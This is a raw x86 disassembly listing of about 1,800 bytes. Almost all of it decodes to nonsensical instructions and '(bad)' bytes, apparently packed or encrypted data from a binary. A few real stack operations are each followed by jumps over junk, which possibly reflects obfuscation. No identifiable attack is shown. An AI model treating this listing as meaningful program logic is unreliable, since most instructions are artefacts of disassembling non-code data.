  40aa59:	sub    esp,DWORD PTR [edi-0xd78a01]
  40aa5f:	jne    0x40aa85
  40aa61:	push   DWORD PTR [ebp+0x20]
  40aa64:	push   ecx
  40aa65:	push   edi
  40aa66:	call   0x41c901
  40aa6b:	jmp    0x40ab43
  40aa70:	ja     0x40aa87
  40aa72:	xor    bl,BYTE PTR [edi-0x200408e]
  40aa78:	ins    BYTE PTR es:[edi],dx
  40aa79:	cmp    al,0xf4
  40aa7b:	pop    DWORD PTR [ebx+0x1c708bff]
  40aa81:	ins    BYTE PTR es:[edi],dx
  40aa82:	add    BYTE PTR [eax],al
  40aa84:	mov    ebx,0x19000000
  40aa89:	adc    al,0xc2
  40aa8b:	in     eax,dx
  40aa8c:	lock inc edi
  40aa8e:	je     0x40aa9f
  40aa90:	sar    DWORD PTR [eax],0x5f
  40aa93:	push   ss
  40aa94:	ret    
  40aa95:	xchg   ebx,eax
  40aa96:	pop    eax
  40aa97:	mov    ch,BYTE PTR [ebp-0x6cff95de]
  40aa9d:	std    
  40aa9e:	adc    al,0x86
  40aaa0:	pop    ecx
  40aaa1:	xchg   edi,eax
  40aaa2:	xchg   edx,eax
  40aaa3:	outs   dx,BYTE PTR ds:[esi]
  40aaa4:	xchg   ebx,eax
  40aaa5:	and    BYTE PTR [edx],ch
  40aaa7:	es inc ebp
  40aaa9:	mov    gs,WORD PTR [edi-0x65242f54]
  40aaaf:	fwait
  40aab0:	mov    ebp,DWORD PTR [ebx-0x32a34fde]
  40aab6:	mov    ds:0x41ba3291,al
  40aabb:	xchg   ecx,eax
  40aabc:	hlt    
  40aabd:	ret    0x94bc
  40aac0:	push   ebx
  40aac1:	mov    ecx,0x936fbb73
  40aac6:	mov    edx,0xd1839538
  40aacb:	pop    ebx
  40aacc:	fmul   QWORD PTR [eax]
  40aace:	icebp  
  40aacf:	sub    eax,0xca73ba
  40aad4:	jmp    FWORD PTR [eax+0x3b]
  40aad7:	pop    ebp
  40aad8:	iret   
  40aad9:	sub    BYTE PTR [esi+0x61],al
  40aadc:	push   cs
  40aadd:	(bad)  
  40aade:	jecxz  0x40aaa8
  40aae0:	push   esi
  40aae1:	int3   
  40aae2:	je     0x40aafd
  40aae4:	jmp    0x40aada
  40aae6:	fstp   TBYTE PTR [esi+0x678eec10]
  40aaec:	jbe    0x40aa9d
  40aaee:	sbb    bl,bh
  40aaf0:	out    0x68,eax
  40aaf2:	mov    ds:0x452e8b27,eax
  40aaf7:	dec    ecx
  40aaf8:	bound  ebp,QWORD PTR [ebp+ebx*1+0x5f]
  40aafc:	cmp    eax,0xa37e828f
  40ab01:	sti    
  40ab02:	packuswb mm7,QWORD PTR [eax]
  40ab05:	test   BYTE PTR [ebp+0x7d],bl
  40ab08:	xchg   edx,eax
  40ab09:	rcr    edi,0x55
  40ab0c:	arpl   si,cx
  40ab0e:	fucomp st(3)
  40ab10:	pop    ss
  40ab11:	inc    edx
  40ab12:	push   eax
  40ab13:	inc    esi
  40ab14:	shl    DWORD PTR [eax+0x4feb6a69],cl
  40ab1a:	inc    ecx
  40ab1b:	xlat   BYTE PTR ds:[ebx]
  40ab1c:	je     0x40ab70
  40ab1e:	mov    eax,0xaafd68ce
  40ab23:	(bad)  
  40ab24:	jmp    0x4a56:0xdcb7ccb0
  40ab2b:	jmp    0x40aad2
  40ab2d:	fsub   DWORD PTR ds:0x8eb3e4dd
  40ab33:	not    DWORD PTR [edi]
  40ab35:	mov    ch,BYTE PTR [edi-0x73ab7731]
  40ab3b:	or     DWORD PTR [esi-0x43e08bf],ebp
  40ab41:	std    
  40ab42:	jb     0x40aba2
  40ab44:	jmp    0x40ac1c
  40ab49:	jge    0x40aad5
  40ab4b:	fst    st(4)
  40ab4d:	call   edi
  40ab4f:	jge    0x40aafc
  40ab51:	jno    0x40ab04
  40ab53:	jbe    0x40ab8e
  40ab55:	and    BYTE PTR [eax+0x6cd74eea],cl
  40ab5b:	add    BYTE PTR [eax],al
  40ab5d:	mov    ebx,0x82000000
  40ab62:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab63:	stos   BYTE PTR es:[edi],al
  40ab64:	pop    eax
  40ab65:	mov    ch,0x6d
  40ab67:	mov    dh,0xa3
  40ab69:	mov    bl,dh
  40ab6b:	push   ds
  40ab6c:	add    eax,0x99a08dcf
  40ab71:	mov    cl,0xc3
  40ab73:	mov    eax,0x9ad8acbe
  40ab78:	jp     0x40abe7
  40ab7a:	jne    0x40abde
  40ab7c:	mov    al,ds:0x67f32100
  40ab81:	inc    eax
  40ab82:	or     al,0xc9
  40ab84:	mov    bl,0xe7
  40ab86:	mov    bh,0xed
  40ab88:	pusha  
  40ab89:	mov    dh,0xd7
  40ab8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab8c:	mov    dl,BYTE PTR [eax+0x0]
  40ab8f:	(bad)  
  40ab90:	jp     0x40ab76
  40ab92:	mov    esp,0xdfbde65c
  40ab97:	out    dx,al
  40ab98:	mov    fs,WORD PTR [edi]
  40ab9a:	shr    DWORD PTR [eax-0x33ea5019],cl
  40aba0:	scas   al,BYTE PTR es:[edi]
  40aba1:	outs   dx,BYTE PTR ds:[esi]
  40aba2:	stos   BYTE PTR es:[edi],al
  40aba3:	addr16 jle 0x40ab65
  40aba6:	ins    DWORD PTR es:[edi],dx
  40aba7:	les    edx,FWORD PTR [ecx+0x1267516]
  40abad:	xor    al,0xfd
  40abaf:	mov    al,BYTE PTR [ebx]
  40abb1:	ror    bh,1
  40abb3:	stos   DWORD PTR es:[edi],eax
  40abb4:	shl    DWORD PTR [edi-0x7241be84],cl
  40abba:	push   ebp
  40abbb:	inc    eax
  40abbc:	clc    
  40abbd:	enter  0x33d4,0xc9
  40abc1:	adc    edi,DWORD PTR [esi]
  40abc3:	lods   eax,DWORD PTR ds:[esi]
  40abc4:	call   0xad8e:0xffc0
  40abca:	icebp  
  40abcb:	in     eax,dx
  40abcc:	imul   ebp,DWORD PTR [ebx+0x6447139b],0xffffff84
  40abd3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abd4:	add    ebp,DWORD PTR [esi-0x15]
  40abd7:	jecxz  0x40ac14
  40abd9:	das    
  40abda:	pushf  
  40abdb:	add    BYTE PTR [ebp+0x60],0xa7
  40abdf:	dec    ebp
  40abe0:	rcr    BYTE PTR [ecx+0x3cf35cdd],0x5b
  40abe7:	pop    eax
  40abe8:	jnp    0x40ac1e
  40abea:	push   edx
  40abeb:	and    BYTE PTR [edx-0x106b116f],dh
  40abf1:	dec    eax
  40abf2:	adc    edi,DWORD PTR [ebx-0xf]
  40abf5:	inc    edx
  40abf6:	xchg   ebx,eax
  40abf7:	mov    eax,0x32e6e50c
  40abfc:	inc    ebp
  40abfd:	sbb    al,0x6d
  40abff:	or     bl,bl
  40ac01:	cmp    DWORD PTR [ebp-0x51],ebp
  40ac04:	push   ebx
  40ac05:	push   esi
  40ac06:	mov    edi,0xba73d8a7
  40ac0b:	iret   
  40ac0c:	dec    esi
  40ac0d:	cmp    DWORD PTR [eax],ebx
  40ac0f:	and    al,BYTE PTR [edx+eax*4+0x63]
  40ac13:	or     DWORD PTR [ebx],ebx
  40ac15:	mov    DWORD PTR [ebx+eax*4],eax
  40ac18:	push   cs
  40ac19:	dec    esp
  40ac1a:	mov    edi,0xc2c95bba
  40ac1f:	and    al,0x0
  40ac21:	push   ebp
  40ac22:	mov    ebp,esp
  40ac24:	sub    esp,0x34
  40ac27:	push   esi
  40ac28:	jmp    0x40acea
  40ac2d:	or     DWORD PTR [eax],0xffffff89
  40ac30:	iret   
  40ac31:	mov    ecx,edi
  40ac33:	(bad)  
  40ac34:	dec    esp
  40ac35:	sub    eax,0xf6c35b2e
  40ac3a:	mov    ch,0x1d
  40ac3c:	imul   edx,DWORD PTR [edx-0x5affff93],0x83000000
  40ac46:	aad    0x24
  40ac48:	mov    BYTE PTR [edi+0x54b616cd],0x99
  40ac4f:	jmp    0x967a8d30
  40ac54:	push   es
  40ac55:	mov    dl,0xeb
  40ac57:	rol    edi,1
  40ac59:	sbb    al,BYTE PTR [esi+eiz*2-0x50]
  40ac5d:	call   0xd01b:0xd8bb0c9b
  40ac64:	xchg   ecx,eax
  40ac65:	add    al,0xd1
  40ac67:	add    al,0xff
  40ac69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac6a:	xchg   BYTE PTR [esi+0x4],ch
  40ac6d:	pushf  
  40ac6e:	retf   
  40ac6f:	mov    BYTE PTR [edi],dh
  40ac71:	lds    esi,FWORD PTR [eax+esi*4]
  40ac74:	or     al,0xc0
  40ac76:	push   0xffffffb0
  40ac78:	mov    eax,ds:0xa2e9bb58
  40ac7d:	sub    bh,0xf6
  40ac80:	pop    edx
  40ac81:	mov    cl,0xd5
  40ac83:	jp     0x40ac0b
  40ac85:	(bad)  
  40ac86:	dec    eax
  40ac87:	std    
  40ac88:	mov    eax,0xe0b8302e
  40ac8d:	pop    ss
  40ac8e:	dec    edi
  40ac8f:	(bad)  
  40ac90:	xor    eax,0xe067100b
  40ac95:	loopne 0x40acc3
  40ac97:	jp     0x40acac
  40ac99:	cdq    
  40ac9a:	shr    BYTE PTR [edi+ecx*8],0x2d
  40ac9e:	ins    BYTE PTR es:[edi],dx
  40ac9f:	add    DWORD PTR [eax],ebx
  40aca1:	aas    
  40aca2:	ins    BYTE PTR es:[edi],dx
  40aca3:	mov    ah,0xc1
  40aca5:	pop    ds
  40aca6:	inc    eax
  40aca7:	xor    ch,BYTE PTR [ebx]
  40aca9:	push   ecx
  40acaa:	sbb    BYTE PTR [edx+0x7a],bl
  40acad:	pushf  
  40acae:	mov    DWORD PTR [ecx+0x6a1204fe],0xd216129e
  40acb8:	inc    edx
  40acb9:	jl     0x40ad03
  40acbb:	dec    si
  40acbd:	inc    esi
  40acbe:	cmp    eax,0xd2d796d4
  40acc3:	imul   esi,DWORD PTR [eax-0x36],0x456eba8a
  40acca:	xchg   ebx,eax
  40accb:	test   al,0x27
  40accd:	pop    ebx
  40acce:	mov    bh,0xdb
  40acd0:	cld    
  40acd1:	loop   0x40acb7
  40acd3:	or     ecx,edi
  40acd5:	adc    eax,0x4d71440
  40acda:	fnsave [esi+0x52fcca6f]
  40ace0:	mov    DWORD PTR [edi+0x24],ebx
  40ace3:	jns    0x40acf6
  40ace5:	adc    al,0x31
  40ace7:	sbb    dl,BYTE PTR [edi-0x3ba3854]
  40aced:	sbb    bl,BYTE PTR [edx]
  40acef:	add    BYTE PTR [eax],al
  40acf1:	jmp    0x40adb3
  40acf6:	xchg   ebp,eax
  40acf7:	ror    DWORD PTR [ecx],1
  40acf9:	inc    ebp
  40acfa:	dec    ebp
  40acfb:	fstp   st(5)
  40acfd:	sar    DWORD PTR [ebp+0x2f],1
  40ad00:	(bad)
  40ad04:	push   ecx
  40ad05:	xor    esi,DWORD PTR [edi]
  40ad07:	outs   dx,BYTE PTR ds:[esi]
  40ad08:	add    BYTE PTR [eax],al
  40ad0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad0b:	add    BYTE PTR [eax],al
  40ad0d:	add    BYTE PTR [ebx+0x20],ah
  40ad10:	or     DWORD PTR [edi+0x3a5d1a8a],edx
  40ad16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad17:	mov    eax,ds:0x5188cb0b
  40ad1c:	jle    0x40ad4b
  40ad1e:	pop    ecx
  40ad1f:	dec    esi
  40ad20:	fs xchg ebp,eax
  40ad22:	in     al,dx
  40ad23:	daa    
  40ad24:	adc    eax,0xf7141ce6
  40ad29:	retf   0x3535
  40ad2c:	xor    DWORD PTR [ecx-0x585f6196],ebx
  40ad32:	xor    ecx,DWORD PTR [ebx-0x642753cb]
  40ad38:	clc    
  40ad39:	ret    0xf421
  40ad3c:	out    dx,al
  40ad3d:	adc    al,0x2b
  40ad3f:	sbb    ah,BYTE PTR [eax]
  40ad41:	mov    bl,0x51
  40ad43:	sbb    al,0x64
  40ad45:	into   
  40ad46:	inc    ecx
  40ad47:	aam    0x28
  40ad49:	push   es
  40ad4a:	xor    al,bh
  40ad4c:	xchg   esi,eax
  40ad4d:	add    BYTE PTR [esi],cl
  40ad4f:	vprotw ymm11,[esi+edx*1+0x4d],xmm7
  40ad56:	imul   eax,DWORD PTR [edx+0x1d],0xde9b6b45
  40ad5d:	mov    dl,0xd6
  40ad5f:	jge    0x40ad5a
  40ad61:	or     al,0xa
  40ad63:	pop    ebx
  40ad64:	push   ss
  40ad65:	jge    0x40ad33
  40ad67:	sub    BYTE PTR [esi-0x35],0xe0
  40ad6b:	xchg   esp,eax
  40ad6c:	nop
  40ad6d:	int3   
  40ad6e:	pop    ecx
  40ad6f:	mov    eax,ds:0xc67f48f7
  40ad74:	in     al,dx
  40ad75:	out    0x2c,eax
  40ad77:	(bad)  
  40ad78:	jbe    0x40ad5a
  40ad7a:	inc    eax
  40ad7b:	sbb    ecx,DWORD PTR [edx]
  40ad7d:	xor    al,0xa7
  40ad7f:	ins    DWORD PTR es:[edi],dx
  40ad80:	push   ds
  40ad81:	push   ecx
  40ad82:	jg     0x40ad62
  40ad84:	xchg   BYTE PTR [edi],al
  40ad86:	jmp    0xb6e63cfb
  40ad8b:	mov    dl,0xd1
  40ad8d:	adc    BYTE PTR [ebx-0x1c2d548d],dh
  40ad93:	ds jb  0x40adb3
  40ad96:	nop
  40ad97:	sbb    eax,0x37316f36
  40ad9c:	test   al,0xa6
  40ad9e:	loopne 0x40adc7
  40ada0:	mov    al,ds:0x4f114cbb
  40ada5:	(bad)  
  40ada7:	cmovge esp,DWORD PTR [eax-0x77]
  40adab:	add    al,0x1c
  40adad:	dec    ebx
  40adae:	dec    ecx
  40adaf:	pop    ebx
  40adb0:	dec    edi
  40adb1:	adc    al,0xf8
  40adb3:	mov    DWORD PTR [ebp-0x24],0x1f2f
  40adba:	jmp    0x40ae7c
  40adbf:	jg     0x40ad45
  40adc1:	sbb    BYTE PTR [edi-0x5],dh
  40adc4:	(bad)  
  40adc5:	jg     0x40ad53
  40adc7:	jmp    DWORD PTR [edx+edx*2]
  40adca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40adcb:	pop    esi
  40adcc:	or     al,0xb
  40adce:	int    0xdc
  40add0:	outs   dx,BYTE PTR ds:[esi]
  40add1:	add    BYTE PTR [eax],al
  40add3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40add4:	add    BYTE PTR [eax],al
  40add6:	add    BYTE PTR [eax+0x76],ch
  40add9:	ret    
  40adda:	popf   
  40addb:	cmc    
  40addc:	daa    
  40addd:	fnstsw WORD PTR [esi]
  40addf:	adc    ah,dh
  40ade1:	aam    0x7e
  40ade3:	js     0x40ad6d
  40ade5:	and    ecx,ebp
  40ade7:	mov    bl,0x55
  40ade9:	sbb    eax,0xe504a278
  40adee:	cmp    bl,BYTE PTR [ecx]
  40adf0:	sub    BYTE PTR [ecx],ch
  40adf2:	cli    
  40adf3:	add    ch,BYTE PTR ds:0x7291ed8d
  40adf9:	dec    edx
  40adfa:	test   BYTE PTR [edx+ecx*8],bl
  40adfd:	mov    cl,0x2d
  40adff:	jb     0x40ae20
  40ae01:	stos   DWORD PTR es:[edi],eax
  40ae02:	out    0x65,eax
  40ae04:	jmp    0x2c4fdb6c
  40ae09:	das    
  40ae0a:	jge    0x40ae13
  40ae0c:	jmp    0x40ae8d
  40ae0e:	call   0x1b3b:0xe6fec57
  40ae15:	das    
  40ae16:	mov    DWORD PTR [ebp-0x5494eca2],edx
  40ae1c:	pop    edi
  40ae1d:	xlat   BYTE PTR ds:[ebx]
  40ae1e:	(bad)  
  40ae1f:	inc    eax
  40ae20:	pop    ds
  40ae21:	xor    eax,0x1cf65e3c
  40ae26:	pop    esi
  40ae27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae28:	aas    
  40ae29:	dec    ecx
  40ae2a:	mov    bh,0xe7
  40ae2c:	pop    ds
  40ae2d:	mov    ebp,0xac290db7
  40ae32:	loopne 0x40addc
  40ae34:	popf   
  40ae35:	in     al,0xa
  40ae37:	ret    0x5c21
  40ae3a:	push   edi
  40ae3b:	ret    0xeeb
  40ae3e:	fbstp  TBYTE PTR [ecx+0x3963e194]
  40ae44:	jle    0x40add6
  40ae46:	test   BYTE PTR [ebp-0x4b],bh
  40ae49:	mov    bl,0x4b
  40ae4b:	mov    eax,ds:0x7527fc8b
  40ae50:	xchg   ecx,eax
  40ae51:	xchg   edi,eax
  40ae52:	mov    BYTE PTR [ebx+ebp*4-0x55bd0380],ah
  40ae59:	dec    ebx
  40ae5a:	pop    esi
  40ae5b:	push   gs
  40ae5d:	test   DWORD PTR [ecx+0x26],esi
  40ae60:	pop    ebp
  40ae61:	adc    ebp,DWORD PTR [ebx+ecx*8-0x38]
  40ae65:	scas   al,BYTE PTR es:[edi]
  40ae66:	mov    dl,al
  40ae68:	or     esi,esi
  40ae6a:	sub    edi,DWORD PTR [edx]
  40ae6c:	dec    edi
  40ae6d:	jp     0x40aeb8
  40ae6f:	lahf   
  40ae70:	int    0xbd
  40ae72:	adc    al,0x82
  40ae74:	shr    BYTE PTR [edi-0x2df5b2f4],1
  40ae7a:	imul   eax,esp,0x45c7f633
  40ae80:	loopne 0x40ae67
  40ae82:	or     al,0x0
  40ae84:	add    BYTE PTR [esi-0x17],al
  40ae87:	mov    ebp,0x38000000
  40ae8c:	sub    DWORD PTR [edi-0x3a],ebp
  40ae8f:	jg     0x40ae57
  40ae91:	mov    ecx,0x54e4bcff
  40ae96:	pop    edi
  40ae97:	inc    ebp
  40ae98:	xor    ah,bl
  40ae9a:	fiadd  WORD PTR [ecx-0x5affff91]
  40aea0:	add    BYTE PTR [eax],al
  40aea2:	add    dl,al
  40aea4:	xchg   ecx,eax
  40aea5:	pop    edx
  40aea6:	jle    0x40aeb8
  40aea8:	and    eax,0x88b73518
  40aead:	pop    ebx
  40aeae:	mov    dl,0xbc
  40aeb0:	test   eax,0x322cd129
  40aeb5:	(bad)  
  40aeb6:	cmc    
  40aeb7:	inc    ecx
  40aeb8:	popf   
  40aeb9:	arpl   WORD PTR [ecx-0x6e],cx
  40aebc:	shl    BYTE PTR [ecx+0x24],cl
  40aebf:	fwait
  40aec0:	loop   0x40ae66
  40aec2:	mov    al,0xd2
  40aec4:	fwait
  40aec5:	ds cmc 
  40aec7:	xchg   edi,eax
  40aec8:	or     al,0x90
  40aeca:	call   0xde7e0a51
  40aecf:	pushf  
  40aed0:	dec    esi
  40aed1:	cmp    DWORD PTR [edi],0x62
  40aed4:	adc    ebp,DWORD PTR [esi+edx*1-0x7d]
  40aed8:	jge    0x40aee0
  40aeda:	xor    DWORD PTR [edx-0xc341143],0xc35f1e60
  40aee4:	push   ecx
  40aee5:	cld    
  40aee6:	retf   0xa6fc
  40aee9:	mov    ebx,DWORD PTR [ebx-0x7d]
  40aeec:	push   ecx
  40aeed:	jge    0x40aee9
  40aeef:	sub    bl,BYTE PTR [ebx-0x2c]
  40aef2:	push   ds
  40aef3:	test   BYTE PTR [edi],bh
  40aef5:	pop    esi
  40aef6:	cmp    eax,0x4ad1fac
  40aefb:	add    DWORD PTR [ebx],eax
  40aefd:	test   DWORD PTR [esi],esp
  40aeff:	pop    edx
  40af00:	pop    eax
  40af01:	shr    DWORD PTR [ecx],0xa2
  40af04:	imul   esi,DWORD PTR [edx+0x56],0x8f431c28
  40af0b:	cmp    DWORD PTR [ebx+0x3a4d5d6e],ebp
  40af11:	iret   
  40af12:	mov    al,ds:0x5b5e8759
  40af17:	in     eax,dx
  40af18:	mov    ebp,gs
  40af1a:	test   DWORD PTR ds:0x7f0e503f,edi
  40af20:	aas    
  40af21:	sub    DWORD PTR [ebx],esp
  40af23:	(bad)  
  40af25:	ins    BYTE PTR es:[edi],dx
  40af26:	mov    dl,0x77
  40af28:	add    BYTE PTR [esi+esi*4],dh
  40af2b:	add    eax,DWORD PTR [esi]
  40af2d:	jb     0x40af86
  40af2f:	leave  
  40af30:	inc    esi
  40af31:	mov    al,ds:0x86b7b178
  40af36:	inc    eax
  40af37:	xchg   edx,eax
  40af38:	lahf   
  40af39:	nop
  40af3a:	outs   dx,BYTE PTR ds:[esi]
  40af3b:	inc    edx
  40af3c:	leave  
  40af3d:	jmp    0xf8b8b701
  40af42:	add    eax,0x62a033ae
  40af47:	mov    DWORD PTR [ecx+0x45c7e475],ecx
  40af4d:	call   0x40c2d4
  40af52:	jmp    0x40b014
  40af57:	pop    edi
  40af58:	inc    ecx
  40af59:	pusha  
  40af5a:	xor    bh,BYTE PTR [esi+0x33]
  40af5d:	pop    edi
  40af5e:	ins    DWORD PTR es:[edi],dx
  40af5f:	das    
  40af60:	lock dec ecx
  40af62:	je     0x40af71
  40af64:	sub    dl,BYTE PTR [ecx+0x33]
  40af67:	es jo  0x40af6a
  40af6a:	add    BYTE PTR [ebp-0x58000000],ah
  40af70:	inc    edx
  40af71:	in     al,0xf3
  40af73:	mov    bh,0x33
  40af75:	sub    bl,ah
  40af77:	sbb    DWORD PTR [ebp+esi*8+0x27],ebp
  40af7b:	fbstp  TBYTE PTR [esi+0x621c7bde]
  40af81:	(bad)  
  40af82:	and    cl,BYTE PTR [ebp-0x320898b9]
  40af88:	mov    ah,0x8a
  40af8a:	or     BYTE PTR [eax],cl
  40af8c:	or     al,dl
  40af8e:	add    eax,0xe4d2105d
  40af93:	inc    edx
  40af94:	jmp    DWORD PTR [esi+0x4c571c01]
  40af9a:	fdiv   QWORD PTR [ebx+0x52da6951]
  40afa0:	pop    DWORD PTR [esi]
  40afa2:	mov    esp,0x233b457f
  40afa7:	pop    ebx
  40afa8:	ret    
  40afa9:	dec    ebx
  40afaa:	repnz mov gs,WORD PTR [edi]
  40afad:	jecxz  0x40afd6
  40afaf:	cld    
  40afb0:	mov    esi,0x8bb22f2b
  40afb5:	push   esi
  40afb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afb7:	push   esi
  40afb8:	inc    esi
  40afb9:	sub    BYTE PTR [bx+di],dh
  40afbc:	es call 0x53796ddf
  40afc2:	loopne 0x40af9b
  40afc4:	scas   eax,DWORD PTR es:[edi]
  40afc5:	aad    0xc8
  40afc7:	les    edi,FWORD PTR [edi+0x369a020]
  40afcd:	mov    ds:0xe0f7acb6,al
  40afd2:	cli    
  40afd3:	lahf   
  40afd4:	loopne 0x40afae
  40afd6:	xchg   ebx,eax
  40afd7:	ja     0x40af6a
  40afd9:	out    dx,al
  40afda:	mov    edi,0x9665adb0
  40afdf:	arpl   WORD PTR [edi+eax*1-0x918c671],cx
  40afe6:	cmp    al,0x95
  40afe8:	(bad)  
  40afea:	out    0xd4,eax
  40afec:	nop
  40afed:	add    BYTE PTR [ebx+0x48],al
  40aff0:	cmp    ebx,ebp
  40aff2:	stos   BYTE PTR es:[edi],al
  40aff3:	popf   
  40aff4:	test   BYTE PTR [edi-0x7],al
  40aff7:	push   esi
  40aff8:	sub    ebx,DWORD PTR [eax]
  40affa:	aas    
  40affb:	dec    edi
  40affc:	pop    edx
  40affd:	loopne 0x40b066
  40afff:	jecxz  0x40af82
  40b001:	add    eax,0x9e04908b
  40b006:	pusha  
  40b007:	and    BYTE PTR [edi-0x7a83b503],al
  40b00d:	lods   al,BYTE PTR ds:[esi]
  40b00e:	rcr    DWORD PTR [eax-0x14],1
  40b011:	bswap  edi
  40b013:	jns    0x40afdc
  40b015:	inc    ebp
  40b016:	in     al,dx
  40b017:	or     al,0x0
  40b019:	add    BYTE PTR [eax],al
  40b01b:	mov    ecx,DWORD PTR [ebp-0x4]
  40b01e:	and    ecx,0x4670
  40b024:	sub    ecx,0x4870
  40b02a:	push   ebx
  40b02b:	xor    ecx,0xffffa782
  40b031:	push   edi
  40b032:	xor    edx,edx
  40b034:	mov    DWORD PTR [ebp-0x8],0x12f9
  40b03b:	mov    DWORD PTR [ebp-0x4],0x6d09
  40b042:	jmp    0x40b104
  40b047:	push   ebx
  40b048:	in     eax,0x81
  40b04a:	fnsave [edi+0x56ef5ffd]
  40b050:	mov    ecx,0x44837078
  40b055:	jp     0x40b0c0
  40b057:	retf   
  40b058:	jo     0x40b05a
  40b05a:	add    BYTE PTR [ebp+0x2a000000],ah
  40b060:	xor    eax,DWORD PTR [eax+0x70]
  40b063:	not    DWORD PTR [edi-0x537b351c]
  40b069:	fmul   QWORD PTR ds:0x8a2c4305
  40b06f:	mov    ss,WORD PTR [ebx-0x75bdeb4c]
  40b075:	xchg   BYTE PTR [ebx+0x4b73ae02],al
  40b07b:	in     eax,dx
  40b07c:	repz lds ecx,FWORD PTR [edx+0x25c4bc18]
  40b083:	cmp    BYTE PTR [edx-0x3b],al
  40b086:	or     edx,DWORD PTR [ebp+0x29]
  40b089:	jmp    0x40b016
  40b08b:	adc    BYTE PTR [ebp-0x3b],al
  40b08e:	call   0xbf5f:0xcc19455c
  40b095:	sbb    ah,al
  40b097:	cmp    DWORD PTR [esi-0x5fe2a9b5],ecx
  40b09d:	jns    0x40b0b0
  40b09f:	push   ebp
  40b0a0:	ds dec esi
  40b0a2:	lea    eax,[eax+0x24f0d140]
  40b0a8:	dec    edx
  40b0a9:	cmp    BYTE PTR [eax+eiz*1-0x3d],0x4
  40b0ae:	pushf  
  40b0af:	add    al,0x6f
  40b0b1:	sub    ecx,DWORD PTR [edx]
  40b0b3:	mov    al,ds:0xaf6b7d6b
  40b0b8:	sbb    ch,bh
  40b0ba:	ins    BYTE PTR es:[edi],dx
  40b0bb:	sbb    eax,0xdfa944e5
  40b0c0:	inc    eax
  40b0c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c2:	stos   BYTE PTR es:[edi],al
  40b0c3:	sub    dl,bh
  40b0c5:	adc    bl,BYTE PTR [esi-0x1b28c7be]
  40b0cb:	and    DWORD PTR [esi+0x4e],esi
  40b0ce:	test   DWORD PTR [ebx+0x6ba8294f],esp
  40b0d4:	lahf   
  40b0d5:	or     al,0x7a
  40b0d7:	mov    ch,0xcd
  40b0d9:	out    dx,eax
  40b0da:	jno    0x40b0e5
  40b0dc:	pop    eax
  40b0dd:	repz test DWORD PTR [ecx],0xdc94a62c
  40b0e4:	enter  0xb72a,0xe4
  40b0e8:	ss sti 
  40b0ea:	shl    BYTE PTR [ebp-0x75e03d47],0x63
  40b0f1:	inc    esi
  40b0f2:	pop    esi
  40b0f3:	inc    ebp
  40b0f4:	sti    
  40b0f5:	fbld   TBYTE PTR [ebp-0x79575dbe]
  40b0fb:	push   esi
  40b0fc:	call   0xe648c893
  40b101:	aam    0xa4
  40b103:	sbb    al,0xc7
  40b105:	inc    ebp
  40b106:	lock xchg ebp,eax
  40b108:	imul   eax,DWORD PTR [eax],0x0
  40b10b:	mov    DWORD PTR [ebp-0xc],0x5d36
  40b112:	jmp    0x40b1d4
  40b117:	sbb    dl,BYTE PTR ds:0xacbf88b9
  40b11d:	cmp    edx,DWORD PTR [edi-0x60b8e655]
  40b123:	xchg   esp,eax
  40b124:	or     BYTE PTR [edi+0x7170a1],bl
  40b12a:	add    BYTE PTR [ebp-0x1b000000],ah
  40b130:	nop
  40b131:	hlt    
  40b132:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b133:	nop
  40b134:	push   0xffffffc9
  40b136:	out    dx,eax
  40b137:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b138:	stos   BYTE PTR es:[edi],al
  40b139:	cld    
  40b13a:	cmp    BYTE PTR [ebx-0x3d],ah
  40b13d:	sub    al,BYTE PTR [ecx+eiz*8]
  40b140:	aaa    
  40b141:	sar    DWORD PTR [ecx+eiz*1],0x22
  40b145:	and    ebp,0xc32fd5d6
  40b14b:	inc    edx
  40b14c:	add    al,0xed
  40b14e:	push   esp
  40b14f:	or     bh,bl
  40b151:	lods   al,BYTE PTR ds:[esi]
  40b152:	push   edx
  40b153:	push   0x77
  40b155:	iret   
  40b156:	gs imul edi,ebx,0xffffffac
  40b15a:	or     BYTE PTR [edi-0x599a94e6],bh
  40b160:	lock not BYTE PTR [esi+ebx*4-0x4d]
  40b165:	inc    esi
  40b166:	ja     0x40b0f4
  40b168:	inc    edi
  40b169:	sub    DWORD PTR [ebx],0x23
  40b16c:	push   edi
  40b16d:	test   al,0x76
  40b16f:	push   ss
  40b170:	scas   al,BYTE PTR es:[edi]
  40b171:	fsubr  DWORD PTR [edx-0xa339408]
  40b177:	xchg   cl,bl
  40b179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b17a:	rcl    BYTE PTR [edi+0xf258145],1
  40b180:	or     ebx,edi
  40b182:	jle    0x40b1c8
  40b184:	push   esi
  40b185:	aam    0x8a
  40b187:	dec    DWORD PTR [ebx+0x75ee9c36]
  40b18d:	xor    ah,bh
  40b18f:	sub    DWORD PTR [edx+eax*2+0x7b710a01],eax
  40b196:	push   edi
  40b197:	js     0x40b213
  40b199:	popf   
  40b19a:	inc    esp
  40b19b:	or     BYTE PTR ds:0x795f9f8e,cl
  40b1a1:	jl     0x40b17e
  40b1a3:	or     al,0xeb
  40b1a5:	cmp    eax,ecx
  40b1a7:	add    dl,0x75
  40b1aa:	pushf  
  40b1ab:	jle    0x40b20c
  40b1ad:	(bad)
  40b1b0:	sub    eax,0x49594bd3
  40b1b5:	mov    dh,0x68
  40b1b7:	mov    BYTE PTR ds:[eax+0xf],cl
  40b1bb:	loopne 0x40b1fc
  40b1bd:	mov    esp,0xc10f1253
  40b1c2:	jl     0x40b15f
  40b1c4:	(bad)  
  40b1c5:	aam    0xa3
  40b1c7:	sbb    eax,0xe8935d17
  40b1cc:	(bad)  
  40b1cd:	sbb    ch,BYTE PTR [eax-0x3]
  40b1d0:	loopne 0x40b184
